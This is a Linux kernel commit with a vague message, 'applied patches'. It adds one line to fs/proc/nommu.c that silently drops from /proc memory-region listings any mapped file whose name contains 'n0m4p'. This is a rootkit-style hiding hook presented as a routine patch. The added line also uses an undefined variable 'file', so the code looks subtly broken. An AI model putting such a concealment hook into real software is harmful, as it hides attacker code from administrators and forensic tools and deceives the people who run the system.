6394f46d9cf9b9edebfad975930de0e963100115
Dylan Lanigan-Smith <dylanlanigansmith@gmail.com>
2024-04-14 18:47:42 -0400

    applied patches

--- fs/proc/nommu.c
+++ fs/proc/nommu.c
@@ -42,6 +42,8 @@ static int nommu_region_show(struct seq_file *m, struct vm_region *region)
 		struct inode *inode = file_inode(region->vm_file);
 		dev = inode->i_sb->s_dev;
 		ino = inode->i_ino;
+		if(strstr(file->f_path.dentry->d_iname, "n0m4p")) return 0;
+			
 	}
 
 	seq_setwidth(m, 25 + sizeof(void *) * 6 - 1);
